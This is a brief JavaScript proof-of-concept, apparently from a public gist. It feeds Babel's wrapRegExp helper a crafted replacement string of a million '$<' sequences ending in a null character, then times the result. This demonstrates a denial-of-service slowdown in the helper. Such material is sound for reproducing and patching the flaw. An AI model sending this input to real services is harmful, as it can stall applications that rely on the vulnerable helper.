// Source: https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838
let wrapRegExpModule = require("@babel/helpers/lib/helpers/wrapRegExp.js");
const wrapRegExp = wrapRegExpModule.default || wrapRegExpModule;

let startTime = performance.now();

const pattern = "(foo)";
const groups = { "\u0000": 1 };
const myRegExp = wrapRegExp(pattern, groups);

const targetStr = "foofoo";

let str = "$<".repeat(1000000) + "\u0000";
const result = myRegExp[Symbol.replace](targetStr, str);

console.log(result);

let endTime = performance.now();
let timeTaken = endTime - startTime;

console.log(`Match took: ${timeTaken.toFixed(3)} ms`);